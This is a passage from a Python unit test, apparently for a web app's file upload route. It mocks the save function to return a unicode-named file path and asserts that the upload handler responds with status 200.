            with patch('jarvis.web.routes.uploads._save_upload', return_value="/uploads/unicode.txt"):
                response = await handle_upload(mock_request, mock_auth)
                
                assert response.status_code == 200
